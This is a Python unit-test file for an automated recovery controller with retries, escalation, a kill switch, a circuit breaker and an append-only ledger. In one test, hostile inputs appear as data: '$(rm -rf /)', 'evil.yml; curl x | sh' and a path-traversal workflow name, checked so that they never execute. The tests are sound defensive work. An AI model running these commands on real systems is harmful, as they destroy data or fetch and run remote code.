"""Run 60 — safe self-healing: failure-injection scenarios (deterministic)."""
import copy
import datetime as dt
import inspect
import json
import sqlite3
import unittest
from pathlib import Path
from unittest import mock

from analytics import forward_readiness as fr
from analytics import recovery_controller as rc
from analytics import recovery_policy as rp
from analytics import system_health as sh
from tests.test_system_health import WED, _readiness, baseline

UTC = dt.timezone.utc
RECOVER = {"HSF_AUTONOMY_ENABLED": "true", "HSF_AUTONOMY_MODE": "recover"}
OBSERVE = {"HSF_AUTONOMY_ENABLED": "true", "HSF_AUTONOMY_MODE": "observe"}
OFF = {"HSF_AUTONOMY_MODE": "recover"}


def health(mutate=None, now=WED):
    b = baseline(now)
    if mutate:
        mutate(b)
    return sh.evaluate(b)


def stale_maturation(b):
    b["maturation_runs"] = [x for x in b["maturation_runs"] if x["created_at"] < "2026-09-29"]
    b["maturation_report"]["generated_at"] = b["maturation_runs"][-1]["created_at"]


def decision(plan, code):
    return next(d for d in plan["decisions"] if d["incident_type"] == code)


class Recorder:
    def __init__(self, ok=True, after=None, skipped=False):
        self.calls, self.events, self.ok, self.after, self.skipped = [], [], ok, after, skipped

    def execute(self, action, spec):
        self.calls.append(action)
        return {"ok": self.ok, "skipped": self.skipped, "error": None if self.ok else "boom"}

    def verify(self):
        return self.after

    def append(self, ev):
        self.events.append(ev)


def cycle(h, ledger=(), env=RECOVER, rec=None, now=WED):
    rec = rec or Recorder(after=health())
    out = rc.run_cycle(h, list(ledger), env, execute_fn=rec.execute, verify_fn=rec.verify,
                       append_fn=rec.append, now=now, clock=lambda: now)
    return out, rec


def ev(incident_id, action, result, minutes_ago, verification=None):
    t = (WED - dt.timedelta(minutes=minutes_ago)).isoformat()
    return {"incident_id": incident_id, "action": action, "result": result, "started_at": t,
            "completed_at": t, "verification_result": verification}


class NoRecoveryTests(unittest.TestCase):
    def test_01_healthy_no_recovery(self):
        out, rec = cycle(health())
        self.assertEqual(out["plan"]["decisions"], [])
        self.assertEqual(rec.calls, [])
        self.assertEqual(rec.events, [])

    def test_02_weekend_waiting_no_recovery(self):
        fri = dt.datetime(2026, 10, 2, 23, 50, tzinfo=UTC)
        b = baseline(fri)
        b["now"] = dt.datetime(2026, 10, 4, 12, tzinfo=UTC).isoformat()
        b["readiness"] = _readiness(limiting="NO_FORWARD_DATA", days=0, runs=0)
        out, rec = cycle(sh.evaluate(b), now=dt.datetime(2026, 10, 4, 12, tzinfo=UTC))
        self.assertEqual((out["plan"]["decisions"], rec.calls), ([], []))

    def test_03_friday_400cap_backlog_no_weekend_recovery(self):
        sat = dt.datetime(2026, 10, 3, 8, 35, tzinfo=UTC)
        b = baseline(dt.datetime(2026, 10, 2, 23, 50, tzinfo=UTC))
        b["now"] = sat.isoformat()
        b["maturation_report"].update({"symbols_deferred": 1213, "schema": "hsf-maturation-1.1"})
        b["maturation_report"]["backlog"].update({"deferred_symbols": 1213, "ready_symbols": 1613, "max_symbols": 400})
        h = sh.evaluate(b)
        self.assertEqual({i["incident_id"] for i in h["incidents"]}, {"maturation:MATURATION_CAP_BINDING"})
        out, rec = cycle(h, now=sat)
        self.assertEqual(decision(out["plan"], "MATURATION_CAP_BINDING")["policy"], "WATCH")
        self.assertEqual(rec.calls, [])
        # even a growth-flagged backlog waits for Monday on a weekend
        b["previous"]["subsystems"]["maturation"]["metrics"]["ready_symbols"] = 900
        d = decision(rp.build_plan(sh.evaluate(b), [], RECOVER, now=sat), "BACKLOG_GROWING")
        self.assertEqual(d["policy"], "WATCH")
        self.assertIn("2026-10-05", d["reason"])

    def test_04_transient_429_recovered_no_action(self):
        h = health(lambda b: b["maturation_report"].update({"alpaca_429_count": 3}))
        out, rec = cycle(h)
        self.assertEqual(decision(out["plan"], "RATE_LIMIT_RECOVERED")["policy"], "NO_ACTION")
        self.assertEqual(rec.calls, [])


class AutoRecoverTests(unittest.TestCase):
    def test_05_persistent_provider_failure_bounded_then_escalate(self):
        h = health(lambda b: b["maturation_report"].update({"rate_limited_symbols": 300, "alpaca_429_count": 50}))
        d = decision(rp.build_plan(h, [], RECOVER), "RATE_LIMIT_PRESSURE")
        self.assertEqual((d["policy"], d["action"], d["risk_class"]),
                         ("AUTO_RECOVER", "RETRY_TRANSIENT_PROVIDER_OPERATION", "BOUNDED"))
        ledger = [ev("maturation:RATE_LIMIT_PRESSURE", "RETRY_TRANSIENT_PROVIDER_OPERATION", "FAILED", m)
                  for m in (300, 200)]
        d2 = decision(rp.build_plan(h, ledger, RECOVER), "RATE_LIMIT_PRESSURE")
        self.assertEqual(d2["policy"], "ESCALATE")
        self.assertIn("attempt limit", d2["reason"])
        # two consecutive VERIFICATION failures trip the stricter circuit breaker instead
        vf = [dict(e, result="VERIFICATION_FAILED") for e in ledger]
        self.assertIn("AUTONOMY_CIRCUIT_OPEN", decision(rp.build_plan(h, vf, RECOVER), "RATE_LIMIT_PRESSURE")["reason"])

    def test_06_stale_health_artifact_regenerates(self):
        h = health(lambda b: b["artifacts"]["previous_system_health"].update(generated_at="2026-09-25T17:05:00+00:00"))
        d = decision(rp.build_plan(h, [], RECOVER), "STALE_ARTIFACT_PREVIOUS_SYSTEM_HEALTH")
        self.assertEqual((d["policy"], d["action"], d["risk_class"]), ("AUTO_RECOVER", "REGENERATE_SYSTEM_HEALTH", "SAFE"))

    def test_07_stale_readiness_regenerates(self):
        h = health(lambda b: b["artifacts"]["forward_evidence_readiness"].update(generated_at="2026-09-25T23:15:00+00:00"))
        d = decision(rp.build_plan(h, [], RECOVER), "STALE_ARTIFACT_FORWARD_EVIDENCE_READINESS")
        self.assertEqual((d["policy"], d["action"]), ("AUTO_RECOVER", "REGENERATE_FORWARD_READINESS"))

    def test_08_failed_maturation_retries(self):
        h = health(stale_maturation)
        d = decision(rp.build_plan(h, [], RECOVER), "MATURATION_STALE")
        self.assertEqual((d["policy"], d["action"], d["workflow"]),
                         ("AUTO_RECOVER", "RETRY_MATURATION", "mature-observations.yml"))
        self.assertEqual(rp.ALLOWLIST["RETRY_MATURATION"]["inputs"], {"slack_min": "15", "dry_run": "false"})

    def test_09_maturation_retry_success_verified(self):
        h = health(stale_maturation)
        out, rec = cycle(h, rec=Recorder(ok=True, after=health()))
        self.assertIn("RETRY_MATURATION", rec.calls)
        e = next(x for x in rec.events if x["action"] == "RETRY_MATURATION")
        self.assertEqual((e["result"], e["verification_result"]), ("SUCCESS", "CLEARED"))
        self.assertTrue(e["verification_checks"]["new_successful_run"])

    def test_10_exit_zero_but_incident_remains(self):
        h = health(stale_maturation)
        out, rec = cycle(h, rec=Recorder(ok=True, after=copy.deepcopy(h)))
        e = next(x for x in rec.events if x["action"] == "RETRY_MATURATION")
        self.assertEqual((e["result"], e["verification_result"]), ("VERIFICATION_FAILED", "NOT_CLEARED"))

    def test_11_attempt_limit_escalates(self):
        h = health(stale_maturation)
        ledger = [ev("maturation:MATURATION_STALE", "RETRY_MATURATION", "VERIFICATION_FAILED", 200)]
        out, rec = cycle(h, ledger, rec=Recorder(ok=True, after=copy.deepcopy(h)))
        results = [x["result"] for x in rec.events if x["incident_id"] == "maturation:MATURATION_STALE"]
        self.assertEqual(results[:2], ["VERIFICATION_FAILED", "ESCALATED"])
        esc = out["escalation"]
        self.assertTrue(esc["human_action_required"] or rp.build_plan(h, ledger + rec.events, RECOVER)["escalations"])
        d = decision(rp.build_plan(h, ledger + rec.events, RECOVER, now=WED + dt.timedelta(hours=2)), "MATURATION_STALE")
        self.assertEqual(d["policy"], "ESCALATE")

    def test_12_cooldown_prevents_duplicate_retry(self):
        h = health(stale_maturation)
        ledger = [ev("maturation:MATURATION_STALE", "RETRY_MATURATION", "FAILED", 10)]
        out, rec = cycle(h, ledger)
        self.assertEqual(decision(out["plan"], "MATURATION_STALE")["policy"], "WATCH")
        self.assertNotIn("RETRY_MATURATION", rec.calls)
        self.assertIn("COOLDOWN", [x["result"] for x in rec.events])

    def test_13_universe_refresh_failure_bounded_retry(self):
        def m(b):
            b["workflows"]["refresh-universe.yml"] = [{"created_at": "2026-09-13T10:30:00+00:00", "conclusion": "success",
                                                       "status": "completed", "event": "schedule"}]
        d = decision(rp.build_plan(health(m), [], RECOVER), "WORKFLOW_STALE")
        self.assertEqual((d["policy"], d["action"], d["workflow"]),
                         ("AUTO_RECOVER", "RETRY_UNIVERSE_REFRESH", "refresh-universe.yml"))

    def test_14_suspicious_universe_after_retry_escalates(self):
        h = health(lambda b: b["universe"].update(source="cached", cached_at="2026-09-20T00:00:00+00:00"))
        bad_after = health(lambda b: b["universe"].update(symbol_count=9500))
        out, rec = cycle(h, rec=Recorder(ok=True, after=bad_after))
        e = next(x for x in rec.events if x["action"] == "RETRY_UNIVERSE_PROBE")
        self.assertEqual(e["result"], "VERIFICATION_FAILED")
        self.assertFalse(e["verification_checks"]["universe_not_suspicious"])
        d = decision(rp.build_plan(bad_after, [], RECOVER), "UNIVERSE_SIZE_JUMP")
        self.assertEqual(d["policy"], "ESCALATE")


class ScannerTests(unittest.TestCase):
    def _missed(self, now_offset_min=15):
        slot = dt.datetime(2026, 9, 30, 16, 35, tzinfo=UTC)
        now = slot + dt.timedelta(minutes=now_offset_min)
        b = baseline(now)
        b["scan_runs"] = [x for x in b["scan_runs"] if not x["created_at"].startswith("2026-09-30T16:35")]
        return sh.evaluate(b), now

    def test_15_duplicate_scanner_rerun_prevented(self):
        h, now = self._missed(50)
        inc = next(i for i in h["incidents"] if i["incident_id"] == "scanner:MISSED_SCAN")
        h["subsystems"]["scanner"]["metrics"]["most_recent_success"] = (now - dt.timedelta(minutes=1)).isoformat()
        g = rp.scanner_guard(inc, h, now)
        self.assertFalse(g["conditions"]["no_successful_equivalent"])

    def test_16_scanner_rerun_outside_window_prohibited(self):
        h, now = self._missed(50)
        later = now + dt.timedelta(hours=4)
        inc = next(i for i in h["incidents"] if i["incident_id"] == "scanner:MISSED_SCAN")
        self.assertFalse(rp.scanner_guard(inc, h, later)["conditions"]["within_market_time_window"])

    def test_17_uncertain_idempotency_escalates(self):
        h, now = self._missed(50)
        d = decision(rp.build_plan(h, [], RECOVER, now=now), "MISSED_SCAN")
        self.assertEqual(d["policy"], "ESCALATE")
        self.assertIn("idempotency_proven", d["reason"])
        out, rec = cycle(h, now=now)
        self.assertNotIn("RETRY_SAFE_SCANNER_RUN", rec.calls)


class EscalationTests(unittest.TestCase):
    def test_18_database_unavailable_escalates(self):
        h = health(lambda b: b.update(db_probe={"connected": False, "error": "x"}))
        plan = rp.build_plan(h, [], RECOVER)
        self.assertEqual(decision(plan, "DATABASE_UNAVAILABLE")["policy"], "ESCALATE")
        self.assertTrue(plan["circuit_breaker"]["open"])

    def test_19_unknown_incident_escalates(self):
        h = health()
        h["incidents"] = [{"incident_id": "scanner:SOMETHING_NEW", "severity": "WARNING", "subsystem": "scanner"}]
        d = rp.build_plan(h, [], RECOVER)["decisions"][0]
        self.assertEqual(d["policy"], "ESCALATE")
        self.assertIn("unknown incident", d["reason"])

    def test_20_21_22_prohibited_requests_rejected(self):
        for a in ("CHANGE_SCORING", "CHANGE_THRESHOLD", "REASSIGN_COHORT", "REWRITE_OUTCOMES", "DELETE_DATA",
                  "RESET_EPOCH", "CHANGE_SECRETS", "CHANGE_SCHEDULE", "DEPLOY_CODE", "SWITCH_PROVIDER",
                  "RUN_FORMAL_EVALUATION", "make scoring better"):
            g = rp.decide_requested_action(a)
            self.assertFalse(g["allowed"], a)
            self.assertEqual((g["policy"], g["risk_class"]), ("ESCALATE", "PROHIBITED"))
        self.assertTrue(rp.decide_requested_action("RETRY_MATURATION")["allowed"])

    def test_escalation_artifact(self):
        h = health(lambda b: b.update(db_probe={"connected": False}))
        out, _ = cycle(h)
        md = rc.render_escalation_md(out["escalation"])
        self.assertTrue(md.startswith("# HSF HUMAN ACTION REQUIRED"))
        self.assertIn("DATABASE_UNAVAILABLE", md)
        self.assertIn("Recommended human action", md)


class LedgerTests(unittest.TestCase):
    def test_23_ledger_append_only_roundtrip(self):
        from db import recovery_ledger as led
        conn = sqlite3.connect(":memory:")
        try:
            e = ev("maturation:MATURATION_STALE", "RETRY_MATURATION", "SUCCESS", 5, "CLEARED")
            e["recovery_id"] = "r1"
            e["started_at"] = dt.datetime.now(UTC).isoformat()
            self.assertTrue(led.append_event(e, conn=conn))
            got = led.list_recent(conn=conn)
            self.assertEqual((len(got), got[0]["result"]), (1, "SUCCESS"))
            public = [n for n in dir(led) if not n.startswith("_") and callable(getattr(led, n))]
            self.assertFalse([n for n in public if any(w in n for w in ("delete", "update", "clear", "purge"))])
        finally:
            conn.close()

    def test_event_fields(self):
        out, rec = cycle(health(stale_maturation), rec=Recorder(ok=True, after=health()))
        e = next(x for x in rec.events if x["action"] == "RETRY_MATURATION")
        for k in ("recovery_id", "incident_id", "incident_type", "action", "policy", "risk_class", "detected_at",
                  "started_at", "completed_at", "attempt", "result", "verification_result", "reason", "error",
                  "health_before", "health_after"):
            self.assertIn(k, e)


class KillSwitchAndCircuitTests(unittest.TestCase):
    def test_24_kill_switch_disables_execution(self):
        self.assertEqual(rp.autonomy_config({})["production_state"], "OBSERVE_ONLY")
        out, rec = cycle(health(stale_maturation), env=OFF)
        self.assertEqual(rec.calls, [])
        self.assertEqual(out["plan"]["to_execute"], [])
        self.assertTrue(any(e["result"] == "SKIPPED" for e in rec.events))

    def test_25_observe_mode_plan_only(self):
        out, rec = cycle(health(stale_maturation), env=OBSERVE)
        self.assertEqual(rec.calls, [])
        self.assertEqual(out["plan"]["would_execute"], ["maturation:MATURATION_STALE"])
        self.assertEqual(rp.autonomy_config({"HSF_AUTONOMY_ENABLED": "true", "HSF_AUTONOMY_MODE": "model"})["mode"],
                         "observe")

    def test_26_circuit_breaker_opens(self):
        ledger = [ev(f"x:{i}", "RETRY_MATURATION", "FAILED", 30 + i) for i in range(3)]
        c = rp.circuit_state(health(), ledger, WED)
        self.assertTrue(c["open"])
        self.assertEqual(c["state"], "AUTONOMY_CIRCUIT_OPEN")

    def test_27_circuit_stops_recovery_until_human_reset(self):
        ledger = [ev(f"x:{i}", "RETRY_MATURATION", "FAILED", 30 + i) for i in range(3)]
        out, rec = cycle(health(stale_maturation), ledger)
        self.assertEqual(rec.calls, [])
        self.assertIn("CIRCUIT_OPENED", [e["result"] for e in rec.events])
        self.assertEqual(decision(out["plan"], "MATURATION_STALE")["policy"], "ESCALATE")
        later = WED + dt.timedelta(hours=12)
        still = rp.circuit_state(health(), ledger + rec.events, later)
        self.assertTrue(still["open"])  # failures aged out, but the opened circuit persists
        reset = {"incident_id": "system:AUTONOMY_CIRCUIT_OPEN", "result": "CIRCUIT_RESET",
                 "started_at": (later - dt.timedelta(minutes=1)).isoformat()}
        self.assertFalse(rp.circuit_state(health(), ledger + rec.events + [reset], later)["open"])

    def test_28_verification_uses_regenerated_health(self):
        rec = Recorder(ok=True, after=health())
        calls = []
        rec.verify = lambda: calls.append(1) or health()
        cycle(health(stale_maturation), rec=rec)
        self.assertEqual(len(calls), 1)

    def test_29_new_critical_incident_trips_breaker(self):
        after = health(lambda b: b.update(db_probe={"connected": False}))
        out, rec = cycle(health(stale_maturation), rec=Recorder(ok=True, after=after))
        e = next(x for x in rec.events if x["action"] == "RETRY_MATURATION")
        self.assertEqual(e["new_critical_incidents"], ["database:DATABASE_UNAVAILABLE"])
        self.assertTrue(rp.circuit_state(health(), rec.events, WED)["open"])


class ContractTests(unittest.TestCase):
    def test_30_anti_peeking(self):
        out, _ = cycle(health(stale_maturation))
        sh.assert_clean({"plan": out["plan"], "escalation": out["escalation"]})
        self.assertEqual(sh.forbidden_text(rc.render_plan_md(out["plan"])), [])

    def test_31_epoch_unchanged(self):
        self.assertEqual(fr.FORWARD_EPOCH["forward_epoch_start_timestamp"], "2026-09-26T07:23:11+00:00")
        for spec in rp.ALLOWLIST.values():
            self.assertNotIn("epoch", json.dumps(spec["inputs"]).lower())

    def test_32_33_allowlist_cannot_touch_scoring_or_outcomes(self):
        forbidden_wf = {"train-prebreakout-model.yml", "recalibrate-prebreakout-champion.yml",
                        "recalibrate-ai-confidence-model.yml", "upload-ai-confidence-model.yml",
                        "ablate-ai-confidence.yml", "signal-effectiveness.yml", "freeze-deps.yml",
                        "autonomous-recovery.yml"}
        self.assertFalse(rp.KNOWN_WORKFLOWS & forbidden_wf)
        self.assertEqual(rp.ALLOWLIST["RETRY_MATURATION"]["inputs"]["dry_run"], "false")
        for a in ("CHANGE_SCORING", "REWRITE_OUTCOMES", "REASSIGN_COHORT"):
            self.assertIn(a, rp.PROHIBITED_ACTIONS)

    def test_34_plan_deterministic(self):
        h = health(stale_maturation)
        ledger = [ev("maturation:MATURATION_STALE", "RETRY_MATURATION", "FAILED", 300)]
        a = rp.build_plan(h, ledger, RECOVER, now=WED)
        b = rp.build_plan(copy.deepcopy(h), copy.deepcopy(ledger), dict(RECOVER), now=WED)
        self.assertEqual(json.dumps(a, sort_keys=True), json.dumps(b, sort_keys=True))

    def test_35_malicious_incident_text_never_executes(self):
        h = health()
        h["incidents"] = [{"incident_id": "workflows:WORKFLOW_STALE", "severity": "WARNING", "subsystem": "workflows",
                           "summary": "$(rm -rf /)", "evidence": {"workflow": "evil.yml; curl x | sh"}},
                          {"incident_id": "workflows:CONSECUTIVE_FAILURES", "severity": "WARNING",
                           "subsystem": "workflows", "evidence": {"workflow": "../../autonomous-recovery.yml"}}]
        plan = rp.build_plan(h, [], RECOVER)
        self.assertTrue(all(d["policy"] == "ESCALATE" for d in plan["decisions"]))
        from scripts import autonomous_recovery as ar
        with self.assertRaises(ValueError):
            ar._validated_workflow("RETRY_MATURATION", {"workflow": "evil.yml; sh"})
        with self.assertRaises(ValueError):
            ar._validated_workflow("RETRY_MATURATION", {"workflow": "autonomous-recovery.yml"})
        self.assertEqual(ar.execute_action("RETRY_MATURATION", {"executor": "dispatch", "workflow": "x.yml"})["ok"], False)
        for mod in (ar, rp, rc):
            src = inspect.getsource(mod)
            self.assertNotIn("subprocess", src)
            self.assertNotIn("shell=True", src)
            self.assertNotIn("os.system", src)


class AutonomyReadinessTests(unittest.TestCase):
    def test_recovery_ready_when_wired(self):
        b = baseline()
        b["recovery"] = {"implemented": True, "ledger_available": True, "circuit_open": False,
                         "production_state": "OBSERVE_ONLY", "reason": "kill switch off"}
        a = sh.evaluate(b)["autonomy_readiness"]
        self.assertEqual(a["state"], "RECOVERY_READY")
        self.assertTrue(any("Run 61" in x for x in a["blockers_to_autonomous"]))
        self.assertTrue(any("OBSERVE_ONLY" in x for x in a["blockers_to_autonomous"]))
        b["recovery"]["circuit_open"] = True
        self.assertEqual(sh.evaluate(b)["autonomy_readiness"]["state"], "OBSERVABLE")
        b["recovery"] = {"implemented": True, "ledger_available": False}
        self.assertEqual(sh.evaluate(b)["autonomy_readiness"]["state"], "OBSERVABLE")

    def test_never_autonomous(self):
        self.assertNotIn('"AUTONOMOUS"', inspect.getsource(sh.autonomy).replace("AUTONOMOUS (reserved", ""))


class ScriptTests(unittest.TestCase):
    def test_script_plan_only_with_ledger_unavailable(self):
        import tempfile

        from scripts import autonomous_recovery as ar
        with tempfile.TemporaryDirectory() as d:
            hp = Path(d) / "health.json"
            hp.write_text(json.dumps(health(stale_maturation)))
            called = []
            with mock.patch.object(ar, "OUT", Path(d)), \
                    mock.patch.object(ar, "_ledger", side_effect=RuntimeError("no db")), \
                    mock.patch.object(ar, "execute_action", side_effect=lambda a, s: called.append(a) or {"ok": True}), \
                    mock.patch.dict("os.environ", RECOVER), \
                    mock.patch("sys.argv", ["x", "--execute", "--health", str(hp)]):
                self.assertEqual(ar.main(), 0)
            plan = json.loads((Path(d) / "recovery_plan.json").read_text())
            self.assertEqual(called, [])  # no ledger → cannot enforce bounds → no execution
            self.assertFalse(plan["ledger_available"])
            self.assertEqual(plan["autonomy"]["production_state"], "OBSERVE_ONLY")
            self.assertTrue((Path(d) / "human_escalation.md").exists())


if __name__ == "__main__":
    unittest.main()
